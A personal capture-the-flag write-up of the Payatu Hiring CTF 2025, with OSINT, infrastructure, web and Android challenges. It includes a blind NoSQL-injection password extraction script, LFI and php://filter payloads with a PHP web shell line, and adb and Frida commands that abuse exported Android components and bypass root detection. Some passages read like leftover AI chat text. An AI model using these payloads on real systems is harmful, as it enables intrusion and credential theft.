---
icon: google-drive
cover: ../.gitbook/assets/gglue136.png
coverY: 0
---

# Payatu Hiring CTF 2025 Full Writeup

<figure><img src="../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

### **Event Duration:**

🗓️ _June 28, 2025, 11:00 a.m. IST_ → _June 29, 2025, 12:00 p.m. IST_

**Format:** 24-hour Capture The Flag competition

**Host:** [Payatu](https://payatu.com/)

***

### Introduction

The **Payatu Hiring CTF 2025** was an intense 24-hour cybersecurity challenge organized by Payatu, aimed at evaluating participants' technical skills across multiple security domains. The event began on **June 28, 2025 at 11:00 AM IST** and concluded on **June 29, 2025 at 12:00 PM IST**.

Over the course of the competition, I engaged with a diverse set of challenges distributed across the following categories:

* **OSINT**
* **Infrastructure**
* **Web**
* **Mobile**
* **Forensics**

Each category tested distinct skill sets including logical reasoning, reverse engineering, mobile app analysis, web exploitation, and real-world reconnaissance.

***

### My Exp

While I don't recall the exact final score, I achieved **3200+ points**, **which felt disappointing to me personally. Still, I’m proud that I stayed true to the process and learned a lot in the journey. The challenge was realistic, well-structured, and genuinely enjoyable. It’s not always about the rank — sometimes, it’s about how you play the game. Better luck next time**

***



## OSINT CHALLENGES

<figure><img src="../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

### 1. Flight of the Lurk3r&#x20;

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

**Description**: The challenge provided a zip file named `WindowSeatA+1.zip`. The task was to compute its MD5 hash and submit it in the format `PAYATU{<hash>}`.

**Why**: This appeared to be a warm-up challenge testing basic file analysis and hash computation skills, common in CTFs to ensure participants can handle file integrity checks.

**What We Found**: The zip file was straightforward, with no additional files or clues in the description, suggesting the hash was the key.

**What We Did**:

*   Used the `md5sum` command to calculate the MD5 hash:

    ```bash
    md5sum WindowSeatA+1.zip

    ```
*   The output was:

    ```
    088858b0048b014e450d40bade8cb89d  WindowSeatA+1.zip

    ```
* Formatted the hash into the required flag format.

**Next Steps**: Submitted the flag to confirm it was correct, then moved to the next challenge, expecting related clues since this was part of an OSINT series.

**Flag**: `PAYATU{088858b0048b014e450d40bade8cb89d}`

***

### 2. The Lake Below

**Description**: Unzipping the provided file revealed an image showing a large, curved lake with mountainous terrain and part of a KLM aircraft wing. The task was to identify the lake.

<figure><img src="../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

Why: The image suggested a reverse image search to find its origin, a common OSINT technique for identifying locations or sources.\
What We Found: The image was a clear aerial view, likely taken during a flight, and the KLM branding hinted at a European context.

<figure><img src="../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>



**What I Did**:

* Performed a reverse image search using Google Images.
* The search led to a travel blog post containing the same image.
* Scrolled to the blog’s conclusion, where the author mentioned: “One last view of Lago Maggiore before the final approach into Milan.”

```jsx
hey just take a PAuse 🪤 You walked right into it…

i only ever Answer the firsT question I’m asked 😎

now yoU want more details? hah… not so easy.

you missed the chance to ask the right question, one that might’ve earned you a tiny breadcrumb.

find a way to ask something else, if you can. but don’t bother me again. i won’t be replying anymore.

good luck, seeker 📸
beautiful, isn't it? some _Places just stick with y0u long after you've passed them by ⛰

not many recognize It from up here… but those who do, usually aren't guessing.✨

you could say it's one of those postcard spots, if you know where to staNd.☁

then again, some views are meanT for those who look twice} 📸
you want my flight number too? _A_mbitious 😏

i mean… it's not like I tried to hide it mayBe.🫠

the wing says en0ugh - if you're not just admiring the clouds 🌥

aNd the world oUtside? Full of landmarks for thoSe who know how to look.🌏

some people even say I leave trails in my posts… but hey, maybe they're just dreaming ✈
{ohhh now you're curious where I'm HEaded? cute 😏

let's just say… I like to stay in the window seat, watching the woRld blur bE.

_I've already left clues in the cloudS…✈

you looked at the photo, but did you really look at who posted it?

try not to miss what's flying right in front of you.☁
```

* Deduced the lake was Lago Maggiore and formatted the flag.

**Next Steps**: Noted the blog as a potential source for other challenges, especially since it mentioned a flight from Amsterdam to Milan, and proceeded to the next challenge.

**Flag**: `PAYATU{Lago_Maggiore}`

***

### 3. The Town at the Edge

**Description**: Using the same image, the task was to identify the town in the top-right corner.

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

**Why**: Since the image was reused from the previous challenge, the blog likely contained additional relevant information, a common pattern in CTF challenge sets.

**What We Found**: The blog explicitly mentioned the town in the context of the image.

**What We Did**:

* Re-visited the travel blog from “The Lake Below.”
* Found the line: “The town in the top right corner is Lugano (Switzerland), on the shores of Lago di Lugano.”
* Used this information to format the flag.

**Next Steps**: Confirmed the blog was a central resource for multiple challenges and anticipated further connections in the OSINT series, such as flight details.

**Flag**: `PAYATU{Lugano}`

***

### 4. The Flight Code

**Description**: The task was to find the KLM flight number for a flight from Amsterdam to Milan, with a hint: “Not all codes belong to cargo — some carry ghosts.”

<figure><img src="../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

**Why**: The hint suggested a specific flight, possibly tied to the image’s context (KLM branding, Amsterdam-to-Milan route). The “ghosts” part implied a non-obvious or historical flight.

**What We Found**: The image’s metadata and blog context pointed to a specific flight route and time.

**What We Did**:

* Extracted metadata from the image using `exiftool`, revealing a timestamp: `2021:10:15 11:40:08.619+02:00` (Milan time).
* Converted this to IST (approximately 3:10 p.m. IST) to align with the CTF’s timezone context.
* Researched KLM flights from Amsterdam (AMS) to Milan, noting the blog mentioned Milan Malpensa (MXP) but finding KLM had suspended MXP flights during that period.

<figure><img src="../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

* Shifted focus to Milan Linate (LIN) and searched for flights landing around noon Milan time (3:30 p.m. IST).
* Identified flight KL1615 (AMS to LIN) as a match based on schedule data.
* Formatted the flag as `PAYATU{KL1615}`.

**Next Steps**: Noted the aircraft type from the flight data (Boeing 737-800) as a potential clue for the next challenge and proceeded.

**Flag**: `PAYATU{KL1615}`

***

### 5. The Type of Wings

**Description**: The task was to find the ICAO code for the Boeing 737-800, referenced in the flight details from the previous challenge.

<figure><img src="../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>

**Why**: The flight number (KL1615) likely operated a Boeing 737-800, and ICAO codes are standard identifiers for aircraft types in aviation.

**What We Found**: The Boeing 737-800 has a well-documented ICAO code.

**What We Did**:

* Searched Wikipedia for the Boeing 737-800, which listed its ICAO code as B738.
* Formatted the flag accordingly.

**Next Steps**: Anticipated further metadata-related challenges, as the image had been a recurring element, and moved to the next OSINT task.

**Flag**: `PAYATU{B738}`

***

### 6. The Cryptic Phantom

**Description**: The challenge hinted at EXIF metadata in the image, with phrases like “leaves footprints in frames” and “the watcher has a hidden name,” suggesting the flag was in the author field.

<figure><img src="../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

**Why**: The hint strongly pointed to EXIF metadata, a common source for hidden data in CTF images, and “hidden name” implied encoding like Base64.

**What We Found**: The image contained an encoded author field in its metadata.

**What We Did**:

* Ran `exiftool` on the image, extracting the author field: `bHVyazNyX2luX3AxYW5l`.
* Recognized it as Base64 and decoded it: `lurk3r_in_p1ane`.
* Formatted the flag as `PAYATU{lurk3r_in_p1ane}`.

**Next Steps**: Suspected the decoded author name (`lurk3r_in_p1ane`) was a clue for the next challenge, likely tied to a social media handle, and proceeded.

**Flag**: `PAYATU{lurk3r_in_p1ane}`

***

### 7. The Phantom Behind the Lens

**Description**: The task was to find a social media handle associated with the author from the previous challenge.

<figure><img src="../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

**Why**: The previous flag (`lurk3r_in_p1ane`) suggested a username or alias to be traced online, likely on social media, given the hint about “hiding behind the shutter.”

**What We Found**: A Google Dork search revealed a relevant Instagram handle.

**What We Did**:

* Used a Google Dork query: `intext:"lurk3r_in_p1ane"`.
* Discovered an Instagram handle `amster_m_illiano`, a clever combination of Amsterdam and Milano, fitting the flight context.
* Formatted the flag as `PAYATU{amster_m_illiano}`.

**Next Steps**: Noted the Instagram handle for the bonus challenge, as the hint suggested further interaction on a mobile device.

**Flag**: `PAYATU{amster_m_illiano}`

***

### 8. Bonus Challenge :  The Final

**Description**: The challenge required revisiting the Instagram account `amster_m_illiano` on a mobile device to uncover a hidden flag through a chatbot interaction.

**Why**: The mobile device requirement and Instagram focus suggested an interactive element, possibly a hidden feature in the DMs.

**What We Found**: The Instagram DMs contained a chatbot with a mini-game-like interaction.

**What We Did**:

* Accessed `amster_m_illiano` on a mobile Instagram app.

<figure><img src="../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

* Initiated a DM and found a chatbot prompt: “Congratulations 🎉 I was the lurk3r flying in that plane ✈️ If you want to get more details from me, click on ‘more details please’.”
* Selected “more details please,” but the initial response was cryptic, indicating a wrong question.
* Deleted the message and retried, discovering the chatbot allowed multiple attempts.
* Asked all four interactive questions, noticing capitalized letters in each response.
* Collected the uppercase letters across responses, forming the flag: `HERE_IS_A_B0NUS_P0INT`.
* Formatted the flag as `PAYATU{HERE_IS_A_B0NUS_P0INT}`.

**Next Steps**: Concluded the OSINT series, reflecting on the creative use of social media and preparing for infrastructure challenges.

**Flag**: `PAYATU{HERE_IS_A_B0NUS_P0INT}`

`------------------------------------------------------------------------------------------`

## INFRASTRUCTURE CHALLENGES

<figure><img src="../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

### 1. Legacy Leaks — The Hidden Holocron

**Description**: The challenge provided SSH access to a target system with credentials, aiming to find a flag.

<figure><img src="../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>

**Why**: SSH access suggests filesystem enumeration to locate sensitive files or credentials, a common CTF infrastructure task.

**What We Found**: A `.env` file with FTP credentials and potential flag locations.

**What We Did**:

* Logged into the target via SSH as `ftpuser`.
* Explored the filesystem and found a `.env` file in `/app` containing FTP credentials.
* Used these credentials to log into an FTP server, retrieving the flag.
* Ran `find / -name *flag* 2>/dev/null` to locate other flag paths, discovering two private key files (`id_rsa` for `user1` and `user2`), but they were not useful (rabbit holes).

<figure><img src="../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

**Next Steps**: Used the FTP access as a stepping stone to explore further directories, expecting more flags or privilege escalation opportunities.

**Flag**: `PAYATU{f7p_4cc355_gr4n73d_n0w_f1nd_7h3_n3x7_573p}`

***



### 2. Legacy Leaks — The Smuggler's Share

**Description**: Continued enumeration to find additional flags and a private key.

<figure><img src="../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>

**Why**: The previous challenge’s credentials and file paths suggested deeper enumeration for more flags or keys.

**What We Found**: A directory with a flag and an encrypted private key.

**What We Did**:

* Enumerated further and found `/shared/backup_share/` with two key directories:
  * One contained a flag.
  * Another held an encrypted `id_rsa` for `user1`.
* Attempted to crack the `id_rsa` passphrase using `john`, but it failed.
* Later realized the intended method was to enumerate `.git` repositories, which I overlooked.

**Next Steps**: Noted the missed `.git` enumeration as a learning point and continued to the next challenge, focusing on user access.

<figure><img src="../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

**Flag**: `PAYATU{5mb_4cc355_c0mpl373_n0w_u53_55h_k3y}`

***

### 3. The Legacy — Shadows of the Restricted Shell

<figure><img src="../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>

**Description**: The task involved bypassing a restricted shell (rbash) for `user1` to retrieve a flag.

**Why**: Restricted shells are common in CTFs, requiring specific bypass techniques to gain full access.

**What We Found**: `user1` was confined to an rbash environment, limiting command execution.

**What We Did**:

* Identified `user1` was in a restricted shell (rbash).
* Referenced resources like:
  * [https://0xffsec.com/handbook/shells/restricted-shells/](https://0xffsec.com/handbook/shells/restricted-shells/)
  * [https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/](https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/)
  * [https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
* Applied rbash bypass techniques (e.g., manipulating PATH or using allowed commands) to gain a full shell.
* Retrieved the flag after bypassing the restrictions.

**Next Steps**: Used the shell access to explore further privilege escalation to `user2` or root.

**Flag**: `PAYATU{r357r1c73d_5h3ll_byp4553d_n0w_g37_r007}`

***

### 4. The Legacy Leaks — The padawan's Path

**Description**: The goal was to escalate to `user2` and potentially root, but root access was not achieved.

<figure><img src="../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>

**Why**: Privilege escalation is a standard CTF objective, often involving SUID binaries or misconfigurations.

**What We Found**: A `make` binary with SUID capabilities, but no exploitable misconfigurations.

**What We Did**:

* As `ctfuser`, enumerated the system and found the `make` binary with SUID, owned by root and the `user2` group.
* Investigated for misconfigurations but found none, preventing unintended root escalation.
* Gained `user2` access through another method (not detailed in the input) to retrieve the flag.
* Attempted root escalation but failed due to secure permissions.

**Next Steps**: Reflected on the failure to root as a learning opportunity and moved to web challenges.

**Flag**: PAYATU{u53r2\_4cc355\_gr4n73d\_n0w\_35c4l473\_pr1v1l3g35}

***

## WEB CHALLENGES

<figure><img src="../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

### 1. Blind Trust

**Description**: A login page hinted at a NoSQL injection vulnerability, likely MongoDB, to bypass authentication and retrieve a flag.

**Why**: The login page and hidden endpoint suggested a database vulnerability, common in web CTFs.

**What We Found**: A `/secret` endpoint and MongoDB-like responses to crafted payloads.

**What We Did**:

#### NoSQL Injection Exploitation

While analyzing the login functionality of the "Blind Trust" web challenge, I identified behavior consistent with a **NoSQL injection vulnerability**, specifically targeting **MongoDB**-based backends.

***

#### Step 1: **Initial Observation & Endpoint Discovery**

**Why we did this:**

Inspecting the page source is a standard enumeration step in CTFs and real pentests. It often reveals comments, hidden routes, or debug endpoints.

**What we found:**

* A hidden endpoint: `/secret`
* Message hinting at NoSQL injection and the need to **log in as "admin"** to retrieve the flag.

***

#### Step 2: **Testing Basic NoSQL Payloads**

**Why we did this:**

To confirm the backend is MongoDB and vulnerable to NoSQL injection. MongoDB treats input as JSON, which can be manipulated using operators like `$eq`, `$ne`, `$gt`, and `$regex`.

**Payload used:**

```json
{
  "username": { "$eq": "admin" },
  "password": { "$ne": null }
}

```

**Response received:**

```json
"flag": "Log in as 'admin' to get the flag"

```

This confirmed two things:

* The database interprets JSON-like structures (MongoDB).
* Input is not sanitized, making it vulnerable to NoSQLi.

***

#### Step 3: **Confirming Password Existence**

**Why we did this:**

To check whether a real password exists for the `admin` user.

**Payload used:**

```json
{
  "username": "admin",
  "password": { "$gt": "" }
}

```

**Response received:**

```json
"flag": "Login with the correct password to get the flag"

```

This validated that `admin` has a non-empty password and we can now enumerate it.

***

#### Step 4: **Regex-Based Password Enumeration**

**Why we did this:**

MongoDB supports regex via `$regex`, which can be used to brute-force the password **character by character** using prefix matching.

**Payload format:**

```json
{
  "username": "admin",
  "password": { "$regex": "^<known_prefix>" }
}

```

Example:

```json
{
  "username": "admin",
  "password": { "$regex": "^s" }
}

```

* If response is **"Login with the correct password..."**, that character is valid.
* If **"invalid credentials"**, character is incorrect.

***

#### Step 5: **Automating with Python Script**

**Why we did this:**

Manual regex guessing is slow. Automating it accelerates the process and ensures precision.

**Script used:**

```python
import requests
import string

charset = string.ascii_letters + string.digits + "_"
response_phrase = "Login with the correct password to get the flag"
known_prefix = ""

while True:
    for c in charset:
        attempt = known_prefix + c
        data = {
            "username": "admin",
            "password": { "$regex": f"^{attempt}" }
        }
        headers = {
            "Content-Type": "application/json"
        }
        try:
            req = requests.post('<http://15.206.146.57:51662/api/login>', json=data, headers=headers)
        except Exception as e:
            print(f"[!] Error: {e}")
            continue
        if response_phrase in req.text:
            known_prefix += c
            print(f"[+] Match: {known_prefix}")
            break
    else:
        print(f"[✓] Password extraction complete: {known_prefix}")
        break

```

**What we achieved:**

The full password was extracted using this regex-based blind enumeration.

***

#### Step 6: **Final Login and Flag Retrieval**

After successfully extracting the password for `admin`, I logged in via the vulnerable endpoint and retrieved the flag:

```
flag: PAYATU{NoSQLi_Success}

```

***

#### Final Thoughts

This challenge demonstrated the practical exploitation of **blind NoSQL injection**:

* By manipulating JSON payloads using MongoDB operators,
* Leveraging regex-based prefix checking to brute-force credentials,
* Automating the attack chain for efficiency and accuracy.

**Why this matters:**

NoSQLi vulnerabilities are increasingly common in modern JavaScript-stack applications (like MEAN/MERN). This challenge reinforced the importance of input sanitization even in NoSQL contexts and how regex logic can be abused for credential brute-forcing.

**Flag**: `PAYATU{NoSQLi_Success}`

***

### 2. Travel Agency

**Description**: The challenge involved a Local File Inclusion (LFI) vulnerability via the `?page=` parameter to read files or achieve Remote Code Execution (RCE).

**Why**: LFI vulnerabilities are common in web CTFs, often leading to source code disclosure or RCE.

#### RFI to RCE Exploitation

While analyzing the target web application, I discovered a **Local File Inclusion (LFI)** vulnerability through the `?page=` parameter.

#### Step 1: **Initial LFI Discovery using `?page=`**

**Why we did this:**

`?page=` parameters are commonly vulnerable to LFI when user input is included in file paths without proper sanitization. By trying simple payloads like `?page=../../../../etc/passwd`, we can test for file reads.

**What happened:**

Initial file read attempts like `/etc/passwd` or log files didn’t work — possibly due to restricted file access or null byte patching.

***

#### Step 2: **Switched to PHP Filters (`php://filter`)**

**Why we did this:**

When normal file inclusion fails or is restricted, **PHP stream wrappers** like `php://filter` can help read the **source code** of PHP files indirectly. Encoding it in base64 allows us to view the file contents in readable form.

**Payload used:**

```
php://filter/convert.base64-encode/resource=index.php

```

**What we got:**

Base64 output of the actual PHP file’s code, which we then decoded to read logic and find inclusion patterns or hidden logic.

***

#### Step 3: **Moved Towards Remote Code Execution (RCE)**

**Why we did this:**

Rather than guessing flag paths or trying multiple filter chains, executing a command directly on the server is faster, more reliable, and confirms full control. RCE is a higher severity vulnerability.

**Method Used:**

We used filter chain payloads and injected this PHP line:

```php
<?php system($_GET[0]); ?>

```

**Result:**

Got direct RCE. Could run system commands via the browser by supplying values to `?0=whoami` or similar.

***

#### Step 4: **Proof of Exploit**

In the HTML response (as shown in the attached image), the application responded with:

```
PAY4UK(BANDIT_IS_BANDIT_RFI)

```

**Why this matters:**

This string confirms that the injected payload was executed by the server — validating both the LFI and the chained RFI/RCE attack path.

**Flag Obtained:**

```
PAYATU{BANDIT_1s_B4ND1T_RFI}

```

***

#### Step 5: **Attempted JWT Exploitation (SEAL THE DEAL)**

**Why we did this:**

The challenge "SEAL THE DEAL" hinted at **JWT algorithm confusion**, a classic attack where servers trust JWTs signed using "none" or allow switching between `HS256` and `RS256`. Attempting this would have allowed login bypass or privilege escalation.

**What happened:**

I was unable to complete this part in time, but recognized the attack surface.

***

#### Final Thoughts

This challenge was a deep dive into chaining misconfigurations:

* Started with LFI.
* Pivoted to `php://filter` for code disclosure.
* Used knowledge of PHP execution and filter chaining for RCE.
* Successfully confirmed execution via custom payload response.

***

## MOBILE CHALLENGES

<figure><img src="../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

Engaging Android-based mobile challenges that tested static and dynamic analysis, Frida scripting, deep linking, native library inspection, and IPC manipulation. Below is a technically detailed walkthrough of the challenges I solved — explained **step-by-step** with **intent**, **actions**, and **outcomes**.

***

### 1. GateKeeper

**Objective:** Bypass a native-level “Magic Phrase” check to reveal a flag.

**Initial Observation:**

* Upon installing the APK and launching the app, we are greeted with a screen asking for a **Magic Phrase**.
* Any incorrect phrase gives: `Wrong key. Try Again.`

<figure><img src="../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

**Step 1: Static Analysis with JADX**

* Decompiled the APK using JADX to inspect the Java logic.

```jsx
public class MainActivity extends AppCompatActivity {
    public native String submitKey(String str);

    static {
        System.loadLibrary("native-lib");
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        TextView textView = new TextView(this);
        textView.setText("🔐There is a phrase I expect, only the right people can C");
        textView.setTextSize(16.0f);
        textView.setPadding(30, 50, 30, 30);
        final EditText editText = new EditText(this);
        editText.setHint("Enter the magic phrase...");
        editText.setPadding(30, 30, 30, 30);
        Button button = new Button(this);
        button.setText("GET FLAG");
        final TextView textView2 = new TextView(this);
        textView2.setTextSize(18.0f);
        textView2.setPadding(30, 50, 30, 30);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.bandit.gatekeeper.MainActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.this.m66lambda$onCreate$0$combanditgatekeeperMainActivity(editText, textView2, view);
            }
        });
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        linearLayout.setPadding(40, 60, 40, 40);
        linearLayout.addView(textView);
        linearLayout.addView(editText);
        linearLayout.addView(button);
        linearLayout.addView(textView2);
        setContentView(linearLayout);
    }

    /* renamed from: lambda$onCreate$0$com-bandit-gatekeeper-MainActivity, reason: not valid java name */
    /* synthetic */ void m66lambda$onCreate$0$combanditgatekeeperMainActivity(EditText editText, TextView textView, View view) {
        textView.setText(submitKey(editText.getText().toString()));
    }
}
```

* Found the following snippet in `MainActivity.java`:

```java
public native String submitKey(String str);

static {
    System.loadLibrary("native-lib");
}

textView.setText(submitKey(editText.getText().toString()));

```

* The app delegates verification logic to a native method `submitKey()` located in `libnative-lib.so`

**Step 2: Native Reverse Engineering with Ghidra**

* Loaded the `libnative-lib.so` into **Ghidra**.
* Found the implementation of `Java_com_bandit_gatekeeper_MainActivity_submitKey`.

<figure><img src="../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

```c
if (strcmp(userInput, "undefined") == 0) {
   return (*env)->NewStringUTF(env, "Correct! Here’s your flag.");
} else {
   return (*env)->NewStringUTF(env, "Wrong key. Try Again.");
}

```

**Analysis:**

* The native code simply compares the input string with the hardcoded string: `undefined`.
* If matched, it returns the flag string to be displayed.

**Step 3: Execution**

* Input: `undefined`
* Output: Correct flag display on the screen.

<figure><img src="../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

&#x20;**Flag:** `PAYATU{N0W_U_C_M3}`

***

### 2. PathFinder

**Objective:** Bypass host validation and abuse WebView + JSInterface to execute a privileged JS method.

<figure><img src="../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

1. Initial Recon – AndroidManifest.xml

Upon decompiling the application using tools like JADX or APKTool, we examined the `AndroidManifest.xml` file and found the following configuration for `MainActivity`:

```xml
<activity
    android:name="com.ctf.pathfinder.MainActivity"
    android:exported="true"
    android:theme="@style/Theme.Pathfinder.NoActionBar"
    android:label="@string/app_name">

    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>

    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="ctf" android:host="payatu" android:path="/web" />
    </intent-filter>
</activity>

```

#### Key Findings

* The app handles deep links using scheme `ctf`, host `payatu`, and path `/web`.
*   Example of a valid deep link:

    `ctf://payatu/web?url=<value>`
* The target activity is exported, meaning it can be externally triggered.

***

#### 2. Code Review – MainActivity.java

Inside `MainActivity`, the application processes the deep link and extracts the `url` query parameter from the intent:

```java
Uri data = getIntent().getData();
if (data != null && "/web".equals(data.getPath())) {
    String url_param = getString(R.string.url_param); // "url"
    this.urlToLoad = data.getQueryParameter(url_param);

```

This URL is then validated and passed to the WebView:

```java
if (this.urlToLoad != null && this.urlToLoad.contains(this.expectedHost)) {
    this.webView.loadUrl("file:///android_asset/WebViewRedirect.html");
}

```

#### Host Expectation

The variable `expectedHost` is read from the app's resources:

```java
this.expectedHost = getString(R.string.host).trim().toLowerCase(); // payatu.com

```

***

#### 3. Host Validation Logic

The app checks the validity of the passed `url` parameter using this function:

```java
private boolean isHostValid(String url) {
    try {
        Uri parsed = Uri.parse(url);
        String host = parsed.getHost();
        if (host == null) return false;
        if (!host.equals(this.expectedHost)) {
            if (!host.endsWith("." + this.expectedHost)) {
                return false;
            }
        }
        return true;
    } catch (Exception e) {
        return false;
    }
}

```

#### Bypass Vector

* The check uses `Uri.getHost()`, which will parse the `host` part of the URL.
* However, a URL like `javascript:AndroidFunction.showFlag()//payatu.com` bypasses this check.
* In this case, `.contains("payatu.com")` passes due to the trailing comment, and the `host` check fails intentionally later.

***

#### 4. WebView Redirection and JavaScript Execution

After the host validation, the app renders a local HTML page:

```java
this.webView.loadUrl("file:///android_asset/WebViewRedirect.html");

```

The HTML includes:

```html
<script type="text/javascript">
    function showFlag(){
        AndroidFunction.showFlag();
    }
    function redirect(url){
        window.location.replace(url);
    }
</script>

```

The application then dynamically executes:

```java
this.webView.loadUrl("javascript:redirect(\\"" + this.urlToLoad + "\\");");

```

This allows the attacker to supply a `javascript:` URL and have it executed in the WebView context.

***

#### 5. Final Payload and Execution

#### Constructed Payload

To exploit this behavior, we craft a payload that:

* Passes the initial string check (`contains(payatu.com)`)
* Fools host validation
* Triggers JavaScript execution to call the `AndroidFunction.showFlag()` method exposed via `addJavascriptInterface`

```bash
adb shell am start -a android.intent.action.VIEW -d \\
"ctf://payatu/web?url=javascript:AndroidFunction.showFlag()%2F%2Fpayatu.com"

```

<figure><img src="../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

The payload uses:

* `javascript:AndroidFunction.showFlag()` as the main execution
* `//payatu.com` appended to pass the string-based validation check
* Proper encoding (`%2F%2F`) to escape the forward slashes

**Flag:** `PAYATU{Th1s_i5_th3_w4y}`

***

Here is the **complete professional and detailed write-up** for the **"WhereAmI" Android challenge**, covering everything from **why each step is done**, **what was found**, and **how the exploitation works**, along with all code and payloads properly documented.

***

### 3. WhereAmI

#### 1. Challenge Overview

The challenge hints at the use of Android's **BroadcastReceiver** mechanism and a Norse mythology reference:

> "Thor is looking for his brother. Maybe he should broadcast a message about finding his brother."

This metaphor suggests that we need to "broadcast" something specific that will lead to discovering the flag.

***

#### 2. Initial Recon – AndroidManifest.xml

Using tools like **JADX**, we analyzed the `AndroidManifest.xml` file of the app and identified an **exported broadcast receiver**:

```xml
<receiver
    android:name="com.payatu.whereami.BroadCastListener"
    android:exported="true">
    <intent-filter>
        <action android:name="com.payatu.whereami.MY_ACTION"/>
    </intent-filter>
</receiver>

```

#### Key Observations

* The BroadcastReceiver `BroadCastListener` is explicitly **exported**, making it accessible from **other applications** or through **ADB**.
* It listens for intents with the action `com.payatu.whereami.MY_ACTION`.

***

#### 3. Code Review – BroadCastListener.java

Upon reviewing the logic inside the BroadcastReceiver:

```java
@Override
public void onReceive(Context context, Intent intent) {
    if (new String(Base64.decode(context.getString(R.string.code), 0))
        .equals(intent.getStringExtra("loc"))) {

        Intent intent2 = new Intent(context, ImTheSecond.class);
        intent2.addFlags(268435456);
        context.startActivity(intent2);
    }
}

```

<figure><img src="../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

#### Breakdown

* The receiver checks if the `loc` value in the received intent matches a base64-decoded string from the app’s resources.
*   The hardcoded value in the app resources is:

    ```
    code = "TWpvbG5pcg=="

    ```
*   Decoding this base64 string:

    ```
    Base64.decode("TWpvbG5pcg==") → "Mjolnir"

    ```
* If the received intent contains `loc=Mjolnir`, it launches the `ImTheSecond` activity using an explicit intent.
* This activity presumably calls a native function like `getFlagNative()` to display the flag.

***

#### 4. Exploitation Plan

We have two approaches to exploit this vulnerability:

#### Option 1: Create a Custom App

You can create your own Android application that broadcasts the required intent.

Example Java code for custom broadcasting:

```java
Intent intent = new Intent("com.payatu.whereami.MY_ACTION");
intent.putExtra("loc", "Mjolnir");
intent.setClassName("com.payatu.whereami", "com.payatu.whereami.BroadCastListener");
sendBroadcast(intent);

```

This code sends a broadcast with the correct `action` and `loc` value to the vulnerable receiver.

#### Option 2: Using ADB (No Need for App)

You can trigger the same logic using ADB directly without writing code:

```bash
adb shell am broadcast \\
  -a com.payatu.whereami.MY_ACTION \\
  --es loc Mjolnir \\
  -n com.payatu.whereami/.BroadCastListener

```

#### Command Breakdown

* `a com.payatu.whereami.MY_ACTION`: specifies the intent action
* `-es loc Mjolnir`: adds the `loc` string extra with the value "Mjolnir"
* `n com.payatu.whereami/.BroadCastListener`: specifies the target component (receiver)

<figure><img src="../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

***

### 5. Expected Outcome

Upon sending the correct broadcast:

1. The app's `BroadCastListener` receives the intent.
2. It decodes the hardcoded base64 string (`Mjolnir`) and matches it with the intent extra.
3. It launches the `ImTheSecond` activity.
4. This activity likely interacts with a native method to fetch and display the flag.

Flag: `PAYATU{WAMI-G0d0F7HUND3RONHUNT}`

***

### 4. Snorlex

**"Find the root cause of the problem"** – Android app with root detection blocking access to a hidden flag in the native library.

***

#### 1. Open the app and observe that we are getting a weird toast message.

Upon launching the app in an emulator (such as MEmu or Genymotion), a toast message is immediately displayed:

```
You are not allowed to enter. Please find the root cause of the problem.

```

This indicates that the application has implemented **root detection** logic, and it’s preventing access based on the root status of the environment.

***

#### 2. We need to bypass the root detection to pass through this toast message.

The message clearly points to the need for analyzing and bypassing root detection logic to proceed. Since many Android apps use third-party libraries to detect root (checking for `su` binaries, `magisk`, etc.), dynamic instrumentation tools like **Frida** are ideal to patch and hook these calls at runtime.

***

#### 3. Running the Root Bypass Frida Script and observe that we are able to bypass it.

We use Frida to attach to the target app and inject a custom root bypass script.

**Command used:**

```bash
frida -U -f com.payatu.snorlex -l "RootStl_Bypass.js"

```

Explanation:

* `U`: use USB device (connected emulator/device)
* `f`: spawn the app (`com.payatu.snorlex`)
* `l`: load the JavaScript file that contains Frida hooks to bypass root checks

The console shows that all checks (native fopen, binaries, magisk paths) are being hooked and returned with dummy/false results.

***

